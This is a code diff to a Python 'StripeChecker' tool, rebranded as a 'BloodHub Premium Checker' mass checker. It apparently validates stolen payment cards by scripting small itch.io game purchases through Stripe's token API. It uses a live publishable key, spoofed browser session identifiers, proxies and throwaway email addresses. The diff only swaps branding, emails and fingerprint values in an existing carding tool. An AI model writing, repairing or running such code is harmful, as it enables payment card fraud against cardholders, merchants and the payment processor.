@@ -37,8 +37,8 @@ class StripeChecker():
         self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
-        print("\n\n  {}------=[ {}BloodHub CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}--= {}Created by BloodHub {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("\n\n  {}------=[ {}BloodHub Premium Checker {}]=------".format(fg[0], fg[1], fg[0]))
+        print("      {}--= {}Mass Checker {}=--          ".format(fg[0], fg[1], fg[0]))
         print("  {}------========================------\n".format(fg[0]))
         self.check()
 
@@ -109,9 +109,9 @@ class StripeChecker():
                 "source": "stripe",
                 "medium": "default",
                 "initiator": "game",
-                "bp": "1352c97c578a5257f528baee67eecf68",
+                "bp": "af76deea6f03b8b072a3201fc428c956",
                 "price": "$4.95",
-                "email": "ckknocktoyou@gmail.com",
+                "email": "grimmhubb@gmail.com",
                 "json": "true"
             }
             purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
@@ -128,10 +128,10 @@ class StripeChecker():
                 'card[exp_month]': ccMonth,
                 'card[exp_year]': ccYear,
                 'card[address_zip]': zipcode,
-                'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
-                'muid': 'ceacade8-663f-48b9-a305-f6b0be7fac82',
-                'sid': 'c6b55fc7-daaf-4219-888b-0af38a4d3f6b',
-                'payment_user_agent': 'stripe.js/e7e4d3cf; stripe-js-v3/e7e4d3cf',
+                'guid': 'bcf060d9-5ed8-4d99-a26c-7b4755bc9d0a',
+                'muid': '7cb62934-caec-4c63-b692-e0b40e963eff',
+                'sid': '650d3f92-7fd1-498e-a8df-6a10ba927035',
+                'payment_user_agent': 'stripe.js/564bb058; stripe-js-v3/564bb058',
                 'referrer': checkout_url,
                 'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
                 'pasted_fields': 'number'
@@ -143,8 +143,8 @@ class StripeChecker():
             result_data = {
                 "csrf_token": csrf,
                 "card_token": tok_id,
-                "bp": "1352c97c578a5257f528baee67eecf68",
-                "email": "ckknocktoyou@gmail.com",
+                "bp": "af76deea6f03b8b072a3201fc428c956",
+                "email": "grimmhubb@gmail.com",
                 "name": Username
             }
             result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
